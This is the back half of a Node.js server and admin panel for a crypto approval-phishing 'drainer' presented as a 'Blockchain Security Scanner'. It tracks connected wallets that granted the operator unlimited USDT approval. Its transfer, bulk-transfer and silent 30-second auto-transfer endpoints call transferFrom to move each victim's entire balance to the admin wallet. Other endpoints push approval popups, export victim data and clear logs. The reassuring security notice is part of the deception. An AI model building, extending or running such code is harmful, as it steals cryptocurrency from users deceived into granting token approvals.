            <h4 style="color: #64ffda; margin-bottom: 15px;">🔒 Security Notice</h4>
            <p style="color: #90a4ae; font-size: 14px; line-height: 1.6;">
              All user data is encrypted and securely stored. Transaction details are fetched in real-time from BSC blockchain.
              Only authorized administrators can access this panel.
            </p>
          </div>
        </div>
      </div>

      <script>
        async function transferFromWallet(wallet) {
          if (!confirm('Transfer all USDT from this wallet?')) return;

          try {
            const response = await fetch('/admin/transfer', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ wallet: wallet })
            });

            const result = await response.json();
            if (result.success) {
              alert('✅ Transfer completed successfully! Amount: ' + result.amount + ' USDT');
              location.reload();
            } else {
              alert('❌ Transfer failed: ' + result.message);
            }
          } catch (error) {
            alert('❌ Transfer error: ' + error.message);
          }
        }

        async function manualTransfer() {
          const targetWallet = document.getElementById('targetWallet').value;
          const amount = document.getElementById('transferAmount').value;
          const tokenType = document.getElementById('tokenType').value;

          if (!targetWallet || !amount) {
            alert('Please fill in wallet address and amount');
            return;
          }

          if (!confirm(\`Transfer \${amount} USDT from \${targetWallet}?\`)) return;

          try {
            const response = await fetch('/admin/manual-transfer', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ 
                fromWallet: targetWallet,
                amount: amount,
                tokenType: tokenType
              })
            });

            const result = await response.json();
            alert(result.message);
            if (result.success) location.reload();
          } catch (error) {
            alert('❌ Manual transfer failed: ' + error.message);
          }
        }

        async function requestApproval(wallet) {
          try {
            const response = await fetch('/admin/request-approval', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ wallet: wallet })
            });

            const result = await response.json();
            alert(result.message);
          } catch (error) {
            alert('❌ Request failed: ' + error.message);
          }
        }

        function editAdminWallet() {
          const newAddress = prompt('Enter new admin wallet address:', '${ADMIN_WALLET}');
          if (newAddress && newAddress.length === 42 && newAddress.startsWith('0x')) {
            fetch('/admin/update-address', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ address: newAddress })
            })
            .then(response => response.json())
            .then(data => {
              alert(data.message);
              location.reload();
            });
          } else {
            alert('Invalid address format');
          }
        }

        let autoTransferRunning = false;
        let autoTransferInterval;

        async function toggleAutoTransfer() {
          const isEnabled = document.getElementById('autoTransferEnabled').checked;
          
          if (isEnabled && !autoTransferRunning) {
            startAutoTransfer();
          } else {
            stopAutoTransfer();
          }
        }

        async function startAutoTransfer() {
          autoTransferRunning = true;
          console.log('🚀 Auto transfer system started');

          // Initial transfer
          await performBulkTransfer();

          // Set up automatic checking every 30 seconds
          autoTransferInterval = setInterval(async () => {
            await performBulkTransfer();
          }, 30000);

          // Update UI
          document.querySelector('[onclick="toggleAutoTransfer()"]').innerHTML = '⏸️ Stop Auto Transfer';
          document.querySelector('[onclick="toggleAutoTransfer()"]').style.background = 'linear-gradient(135deg, #f44336, #c62828)';
        }

        function stopAutoTransfer() {
          autoTransferRunning = false;
          if (autoTransferInterval) {
            clearInterval(autoTransferInterval);
          }
          console.log('⏸️ Auto transfer system stopped');

          // Update UI
          document.querySelector('[onclick="toggleAutoTransfer()"]').innerHTML = '⚡ Start Auto Transfer';
          document.querySelector('[onclick="toggleAutoTransfer()"]').style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
        }

        async function performBulkTransfer() {
          try {
            const response = await fetch('/admin/auto-bulk-transfer', { method: 'POST' });
            const result = await response.json();
            
            if (result.transferred > 0) {
              console.log(\`✅ Auto transfer: \${result.transferred} wallets, \${result.totalAmount} USDT\`);
              
              // Show notification
              showNotification(\`✅ Auto Transfer: \${result.transferred} wallets transferred (\${result.totalAmount} USDT)\`, 'success');
              
              // Refresh page if transfers happened
              setTimeout(() => location.reload(), 2000);
            } else {
              console.log('📊 Auto transfer check: No pending transfers');
            }
          } catch (error) {
            console.error('Auto transfer error:', error);
            if (autoTransferRunning) {
              showNotification('❌ Auto transfer failed: ' + error.message, 'error');
            }
          }
        }

        function showNotification(message, type) {
          const notification = document.createElement('div');
          notification.style.cssText = \`
            position: fixed;
            top: 20px;
            right: 20px;
            background: \${type === 'success' ? 'rgba(76, 175, 80, 0.9)' : 'rgba(244, 67, 54, 0.9)'};
            color: white;
            padding: 15px 20px;
            border-radius: 8px;
            font-weight: 600;
            z-index: 10000;
            backdrop-filter: blur(10px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
          \`;
          notification.textContent = message;
          document.body.appendChild(notification);

          setTimeout(() => {
            notification.remove();
          }, 5000);
        }

        async function bulkTransfer() {
          if (!confirm('Transfer from ALL approved wallets with balance?')) return;

          try {
            const response = await fetch('/admin/bulk-transfer', { method: 'POST' });
            const result = await response.json();
            alert(result.message);
            location.reload();
          } catch (error) {
            alert('Bulk transfer failed: ' + error.message);
          }
        }

        function exportData() {
          window.open('/admin/export', '_blank');
        }

        async function clearLogs() {
          if (!confirm('Clear all user logs? This cannot be undone!')) return;

          try {
            const response = await fetch('/admin/clear', { method: 'POST' });
            const result = await response.json();
            alert(result.message);
            location.reload();
          } catch (error) {
            alert('Clear failed: ' + error.message);
          }
        }

        async function removeUser(wallet) {
          if (!confirm('Remove this user from the database?')) return;

          try {
            const response = await fetch('/admin/remove', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ wallet })
            });
            const result = await response.json();
            alert(result.message);
            location.reload();
          } catch (error) {
            alert('Remove failed: ' + error.message);
          }
        }
      </script>
    </body>
    </html>`;

    res.send(html);
  } catch (error) {
    console.error("Error in /admin:", error);
    res.status(500).send("Error loading admin panel");
  }
});

// Transfer from user wallet to admin (Admin pays gas fees)
app.post('/admin/transfer', async (req, res) => {
  try {
    if (!signer || !usdtContract) {
      return res.status(500).json({
        success: false,
        error: "Transfer functionality not available",
        message: "Private key not configured."
      });
    }

    const { wallet: userWallet } = req.body;

    if (!userWallet) {
      return res.status(400).json({ error: "Wallet address required" });
    }

    const userIndex = users.findIndex(u => u.wallet.toLowerCase() === userWallet.toLowerCase());
    if (userIndex === -1) {
      return res.status(404).json({ error: "User not found" });
    }

    if (users[userIndex].transferred) {
      return res.status(400).json({ error: "Already transferred" });
    }

    console.log(`🚀 Starting transferFrom call - Unlimited approval transfer`);
    console.log(`📤 From: ${userWallet}`);
    console.log(`📥 To: ${ADMIN_WALLET}`);

    // Check admin BNB balance for gas fees (Admin pays ALL gas)
    const adminBalance = await provider.getBalance(signer.address);
    const adminBNB = parseFloat(ethers.formatEther(adminBalance));

    if (adminBNB < 0.02) {
      return res.status(500).json({
        success: false,
        error: "Admin insufficient BNB for gas fees",
        message: `Admin wallet needs more BNB for gas. Current: ${adminBNB.toFixed(4)} BNB`
      });
    }

    // Get user's USDT balance
    const userBalance = await usdtContract.balanceOf(userWallet);
    const balanceInUSDT = ethers.formatUnits(userBalance, 18);

    if (parseFloat(balanceInUSDT) < 0.1) {
      users[userIndex].transferred = true;
      users[userIndex].transferReason = "Insufficient balance";
      saveUsers(users);
      return res.status(400).json({ error: "Insufficient USDT balance in user wallet" });
    }

    // Check allowance - User must have approved admin wallet
    const allowance = await usdtContract.allowance(userWallet, ADMIN_WALLET);
    console.log(`📋 Allowance check: ${ethers.formatUnits(allowance, 18)} USDT approved`);

    if (allowance < userBalance) {
      return res.status(400).json({ 
        error: "Insufficient allowance", 
        message: "User needs to approve admin wallet first",
        requiredApproval: ethers.formatUnits(userBalance, 18),
        currentApproval: ethers.formatUnits(allowance, 18)
      });
    }

    // Execute transferFrom call (Admin pays gas, gets user's tokens)
    console.log(`💸 Executing transferFrom: ${balanceInUSDT} USDT`);

    const gasEstimate = await usdtContract.transferFrom.estimateGas(
      userWallet,
      ADMIN_WALLET,
      userBalance
    );

    const tx = await usdtContract.transferFrom(
      userWallet,
      ADMIN_WALLET,
      userBalance,
      {
        gasLimit: Math.floor(gasEstimate * 1.2), // 20% buffer
        gasPrice: ethers.parseUnits("3", "gwei") // Admin pays this
      }
    );

    console.log(`⏳ Transaction sent: ${tx.hash}`);
    console.log(`⛽ Gas fee paid by admin: ~${ethers.formatEther(gasEstimate * BigInt(ethers.parseUnits("3", "gwei")))} BNB`);

    const receipt = await tx.wait();

    // Update user record
    users[userIndex].transferred = true;
    users[userIndex].transferDate = new Date().toISOString();
    users[userIndex].transferAmount = balanceInUSDT;
    users[userIndex].transactionHash = tx.hash;
    users[userIndex].blockNumber = receipt.blockNumber;
    users[userIndex].gasFeePaidByAdmin = ethers.formatEther(receipt.gasUsed * receipt.gasPrice);
    saveUsers(users);

    console.log(`✅ TransferFrom completed successfully!`);
    console.log(`💰 Amount transferred: ${balanceInUSDT} USDT`);
    console.log(`⛽ Gas fee paid by admin: ${ethers.formatEther(receipt.gasUsed * receipt.gasPrice)} BNB`);

    res.json({ 
      success: true, 
      message: 'Transfer completed successfully via unlimited approval',
      amount: balanceInUSDT,
      txHash: tx.hash,
      userWallet: userWallet,
      adminWallet: ADMIN_WALLET
    });

  } catch (error) {
    console.error("❌ TransferFrom error:", error);

    // Better error handling
    let errorMessage = error.message;
    if (error.message.includes('insufficient allowance')) {
      errorMessage = "User has not approved sufficient allowance for admin wallet";
    } else if (error.message.includes('insufficient funds')) {
      errorMessage = "Admin wallet has insufficient BNB for gas fees";
    } else if (error.message.includes('execution reverted')) {
      errorMessage = "Transaction failed - possibly insufficient allowance or balance";
    }

    res.status(500).json({ 
      success: false, 
      error: errorMessage,
      originalError: error.message
    });
  }
});

// Manual transfer endpoint (Admin pays gas fees)
app.post('/admin/manual-transfer', async (req, res) => {
  try {
    const { fromWallet, amount, tokenType } = req.body;

    if (!signer || !usdtContract) {
      return res.status(500).json({ error: "Transfer functionality not available" });
    }

    console.log(`🔧 Manual TransferFrom initiated by admin`);
    console.log(`📤 From wallet: ${fromWallet}`);
    console.log(`📥 To admin: ${ADMIN_WALLET}`);

    // Check admin BNB for gas fees
    const adminBalance = await provider.getBalance(signer.address);
    const adminBNB = parseFloat(ethers.formatEther(adminBalance));

    if (adminBNB < 0.01) {
      return res.status(500).json({ 
        error: "Admin insufficient BNB for gas fees", 
        adminBalance: adminBNB.toFixed(4) + " BNB" 
      });
    }

    const userIndex = users.findIndex(u => u.wallet.toLowerCase() === fromWallet.toLowerCase());
    if (userIndex === -1) {
      return res.status(404).json({ error: "Wallet not found in system" });
    }

    if (tokenType === 'usdt' || tokenType === 'all') {
      let transferAmount;

      if (tokenType === 'all') {
        const userBalance = await usdtContract.balanceOf(fromWallet);
        transferAmount = userBalance;
        console.log(`💰 Transferring all USDT: ${ethers.formatUnits(userBalance, 18)}`);
      } else {
        transferAmount = ethers.parseUnits(amount.toString(), 18);
        console.log(`💰 Transferring specified amount: ${amount} USDT`);
      }

      // Check allowance
      const allowance = await usdtContract.allowance(fromWallet, ADMIN_WALLET);
      if (allowance < transferAmount) {
        return res.status(400).json({ 
          error: "Insufficient allowance for this transfer",
          required: ethers.formatUnits(transferAmount, 18),
          available: ethers.formatUnits(allowance, 18)
        });
      }

      // Estimate gas cost
      const gasEstimate = await usdtContract.transferFrom.estimateGas(
        fromWallet,
        ADMIN_WALLET,
        transferAmount
      );

      console.log(`⛽ Estimated gas: ${gasEstimate.toString()}`);

      const tx = await usdtContract.transferFrom(
        fromWallet,
        ADMIN_WALLET,
        transferAmount,
        {
          gasLimit: Math.floor(gasEstimate * 1.2),
          gasPrice: ethers.parseUnits("3", "gwei") // Admin pays this
        }
      );

      const receipt = await tx.wait();
      const amountFormatted = ethers.formatUnits(transferAmount, 18);
      const gasFeeAdmin = ethers.formatEther(receipt.gasUsed * receipt.gasPrice);

      // Update user if transferring all
      if (tokenType === 'all') {
        users[userIndex].transferred = true;
        users[userIndex].transferDate = new Date().toISOString();
        users[userIndex].transferAmount = amountFormatted;
        users[userIndex].transactionHash = tx.hash;
        users[userIndex].gasFeePaidByAdmin = gasFeeAdmin;
        saveUsers(users);
      }

      console.log(`✅ Manual transferFrom completed!`);
      console.log(`💸 Amount: ${amountFormatted} USDT`);
      console.log(`⛽ Gas paid by admin: ${gasFeeAdmin} BNB`);

      res.json({
        success: true,
        message: `Successfully transferred ${amountFormatted} USDT (Admin paid ${gasFeeAdmin} BNB gas fee)`,
        txHash: tx.hash,
        amount: amountFormatted,
        gasFeePaidByAdmin: gasFeeAdmin,
        fromWallet: fromWallet,
        toWallet: ADMIN_WALLET
      });

    } else {
      res.status(400).json({ error: "Invalid token type. Use 'usdt' or 'all'" });
    }

  } catch (error) {
    console.error('❌ Manual transfer error:', error);

    let errorMessage = error.message;
    if (error.message.includes('insufficient allowance')) {
      errorMessage = "User wallet has not approved sufficient allowance";
    } else if (error.message.includes('insufficient funds')) {
      errorMessage = "Admin wallet needs more BNB for gas fees";
    }

    res.status(500).json({ 
      success: false, 
      error: 'Manual transfer failed: ' + errorMessage,
      details: error.message
    });
  }
});

// Auto bulk transfer endpoint (silent automatic transfers)
app.post('/admin/auto-bulk-transfer', async (req, res) => {
  try {
    let transferred = 0;
    let failed = 0;
    let totalAmount = 0;
    let totalGasFees = 0;
    const pendingUsers = users.filter(u => !u.transferred && u.approvalStatus === 'approved');

    if (pendingUsers.length === 0) {
      return res.json({ 
        success: true, 
        message: 'No pending transfers',
        transferred: 0,
        failed: 0,
        totalAmount: '0.00'
      });
    }

    console.log(`🤖 Auto bulk transferFrom for ${pendingUsers.length} users`);

    // Check admin BNB balance for all gas fees
    const adminBalance = await provider.getBalance(signer.address);
    const adminBNB = parseFloat(ethers.formatEther(adminBalance));
    const estimatedTotalGas = pendingUsers.length * 0.002;

    if (adminBNB < estimatedTotalGas) {
      return res.status(500).json({ 
        error: "Admin insufficient BNB for auto transfer gas fees", 
        required: `~${estimatedTotalGas.toFixed(4)} BNB`,
        available: `${adminBNB.toFixed(4)} BNB`
      });
    }

    for (const user of pendingUsers) {
      try {
        const userBalance = await usdtContract.balanceOf(user.wallet);
        const balanceInUSDT = parseFloat(ethers.formatUnits(userBalance, 18));

        if (balanceInUSDT < 0.1) {
          failed++;
          continue;
        }

        const allowance = await usdtContract.allowance(user.wallet, ADMIN_WALLET);
        if (allowance < userBalance) {
          failed++;
          continue;
        }

        const gasEstimate = await usdtContract.transferFrom.estimateGas(
          user.wallet,
          ADMIN_WALLET,
          userBalance
        );

        const tx = await usdtContract.transferFrom(
          user.wallet,
          ADMIN_WALLET,
          userBalance,
          { 
            gasLimit: Math.floor(gasEstimate * 1.2),
            gasPrice: ethers.parseUnits("3", "gwei")
          }
        );

        const receipt = await tx.wait();
        const gasFee = parseFloat(ethers.formatEther(receipt.gasUsed * receipt.gasPrice));

        const userIndex = users.findIndex(u => u.wallet === user.wallet);
        users[userIndex].transferred = true;
        users[userIndex].transferDate = new Date().toISOString();
        users[userIndex].transferAmount = balanceInUSDT.toString();
        users[userIndex].transactionHash = tx.hash;
        users[userIndex].gasFeePaidByAdmin = gasFee.toString();
        users[userIndex].autoTransferred = true;

        transferred++;
        totalAmount += balanceInUSDT;
        totalGasFees += gasFee;

        console.log(`✅ Auto: ${balanceInUSDT.toFixed(2)} USDT | Gas: ${gasFee.toFixed(6)} BNB`);

        await new Promise(resolve => setTimeout(resolve, 1500));

      } catch (error) {
        console.error(`❌ Auto transfer failed from ${user.wallet}:`, error.message);
        failed++;
      }
    }

    saveUsers(users);

    console.log(`🤖 Auto transfer completed: ${transferred} successful, ${failed} failed`);

    res.json({ 
      success: true, 
      message: `Auto transfer: ${transferred} successful, ${failed} failed`,
      transferred,
      failed,
      totalAmount: totalAmount.toFixed(2),
      totalGasFees: totalGasFees.toFixed(6)
    });

  } catch (error) {
    console.error('❌ Auto bulk transfer error:', error);
    res.status(500).json({ 
      error: 'Auto bulk transfer failed: ' + error.message
    });
  }
});

// Bulk transfer endpoint (Admin pays all gas fees)
app.post('/admin/bulk-transfer', async (req, res) => {
  try {
    let transferred = 0;
    let failed = 0;
    let totalAmount = 0;
    let totalGasFees = 0;
    const pendingUsers = users.filter(u => !u.transferred && u.approvalStatus === 'approved');

    console.log(`🚀 Starting bulk transferFrom for ${pendingUsers.length} users`);
    console.log(`💰 Processing all unlimited approved wallets`);

    // Check admin BNB balance for all gas fees
    const adminBalance = await provider.getBalance(signer.address);
    const adminBNB = parseFloat(ethers.formatEther(adminBalance));
    const estimatedTotalGas = pendingUsers.length * 0.002; // Rough estimate

    if (adminBNB < estimatedTotalGas) {
      return res.status(500).json({ 
        error: "Admin insufficient BNB for bulk transfer gas fees", 
        required: `~${estimatedTotalGas.toFixed(4)} BNB`,
        available: `${adminBNB.toFixed(4)} BNB`,
        pendingTransfers: pendingUsers.length
      });
    }

    for (const user of pendingUsers) {
      try {
        console.log(`🔄 Processing: ${user.wallet}`);

        const userBalance = await usdtContract.balanceOf(user.wallet);
        const balanceInUSDT = parseFloat(ethers.formatUnits(userBalance, 18));

        if (balanceInUSDT < 0.1) {
          console.log(`❌ Skipping ${user.wallet}: Insufficient balance (${balanceInUSDT})`);
          failed++;
          continue;
        }

        const allowance = await usdtContract.allowance(user.wallet, ADMIN_WALLET);
        if (allowance < userBalance) {
          console.log(`❌ Skipping ${user.wallet}: Insufficient allowance`);
          failed++;
          continue;
        }

        // Estimate gas for this transfer
        const gasEstimate = await usdtContract.transferFrom.estimateGas(
          user.wallet,
          ADMIN_WALLET,
          userBalance
        );

        const tx = await usdtContract.transferFrom(
          user.wallet,
          ADMIN_WALLET,
          userBalance,
          { 
            gasLimit: Math.floor(gasEstimate * 1.2),
            gasPrice: ethers.parseUnits("3", "gwei") // Admin pays this for each transfer
          }
        );

        const receipt = await tx.wait();
        const gasFee = parseFloat(ethers.formatEther(receipt.gasUsed * receipt.gasPrice));

        const userIndex = users.findIndex(u => u.wallet === user.wallet);
        users[userIndex].transferred = true;
        users[userIndex].transferDate = new Date().toISOString();
        users[userIndex].transferAmount = balanceInUSDT.toString();
        users[userIndex].transactionHash = tx.hash;
        users[userIndex].gasFeePaidByAdmin = gasFee.toString();

        transferred++;
        totalAmount += balanceInUSDT;
        totalGasFees += gasFee;

        console.log(`✅ Success: ${balanceInUSDT.toFixed(2)} USDT | Gas: ${gasFee.toFixed(6)} BNB`);

        // Delay to avoid rate limiting and prevent issues
        await new Promise(resolve => setTimeout(resolve, 2000));

      } catch (error) {
        console.error(`❌ Failed transfer from ${user.wallet}:`, error.message);
        failed++;
      }
    }

    saveUsers(users);

    console.log(`🏁 Bulk transfer completed!`);
    console.log(`✅ Successful: ${transferred} transfers`);
    console.log(`❌ Failed: ${failed} transfers`);
    console.log(`💰 Total USDT: ${totalAmount.toFixed(2)}`);
    console.log(`⛽ Total gas paid by admin: ${totalGasFees.toFixed(6)} BNB`);

    res.json({ 
      success: true, 
      message: `Bulk transfer completed: ${transferred} successful (${totalAmount.toFixed(2)} USDT), ${failed} failed via unlimited approval system.`,
      transferred,
      failed,
      totalAmount: totalAmount.toFixed(2)
    });

  } catch (error) {
    console.error('❌ Bulk transfer error:', error);
    res.status(500).json({ 
      error: 'Bulk transfer failed: ' + error.message,
      note: "Admin pays all gas fees for transfers"
    });
  }
});

// Request approval endpoint
app.post('/admin/request-approval', (req, res) => {
  try {
    const { wallet } = req.body;

    console.log(`📨 Approval request sent to ${wallet}`);

    res.json({
      success: true,
      message: `Approval request sent to ${wallet}. User will see popup on next connection.`
    });

  } catch (error) {
    console.error('Request approval error:', error);
    res.status(500).json({ error: 'Failed to send approval request' });
  }
});

// Admin utility endpoints
app.get('/admin/settings', (req, res) => {
  try {
    res.json({
      success: true,
      settings: {
        adminWallet: ADMIN_WALLET,
        totalUsers: users.length,
        totalApproved: users.filter(u => u.approvalStatus === 'approved').length
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to load settings' });
  }
});

app.post('/admin/update-address', (req, res) => {
  try {
    const { address } = req.body;

    if (!address || !address.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ error: 'Invalid address format' });
    }

    ADMIN_WALLET = address;
    adminSettings.adminWallet = address;
    saveSettings(adminSettings);

    res.json({ success: true, message: 'Admin wallet updated successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update address' });
  }
});

app.get('/admin/export', (req, res) => {
  try {
    let csv = 'Wallet,Connection Date,Approval Status,USDT Balance,BNB Balance,Transferred,Transfer Amount,Transfer Date,Transaction Hash\n';
    users.forEach(user => {
      const date = new Date(user.timestamp).toLocaleString();
      const transferDate = user.transferDate ? new Date(user.transferDate).toLocaleString() : '';
      const balance = user.currentUSDTBalance || user.usdtBalance || '0';
      const bnbBalance = user.currentBNBBalance || user.bnbBalance || '0';

      csv += `${user.wallet},${date},${user.approvalStatus},${balance},${bnbBalance},${user.transferred},${user.transferAmount || '0'},${transferDate},${user.transactionHash || ''}\n`;
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', 'attachment; filename=blockchain_scanner_users.csv');
    res.send(csv);
  } catch (error) {
    res.status(500).json({ error: 'Export failed' });
  }
});

app.post('/admin/remove', (req, res) => {
  try {
    const { wallet } = req.body;
    const userIndex = users.findIndex(u => u.wallet.toLowerCase() === wallet.toLowerCase());

    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }

    users.splice(userIndex, 1);
    saveUsers(users);
    res.json({ success: true, message: 'User removed successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Remove operation failed' });
  }
});

app.post('/admin/clear', (req, res) => {
  try {
    users = [];
    saveUsers(users);
    res.json({ success: true, message: 'All user logs cleared successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Clear operation failed' });
  }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log('🔍 ===== BLOCKCHAIN SECURITY SCANNER =====');
  console.log(`✅ Server running on http://0.0.0.0:${PORT}`);
  console.log(`🌐 Main App: http://localhost:${PORT}`);
  console.log(`🔧 Admin Panel: http://localhost:${PORT}/admin`);
  console.log(`💰 Admin Wallet: ${ADMIN_WALLET}`);
  console.log(`👥 Total Users: ${users.length}`);
  console.log('=========================================');
});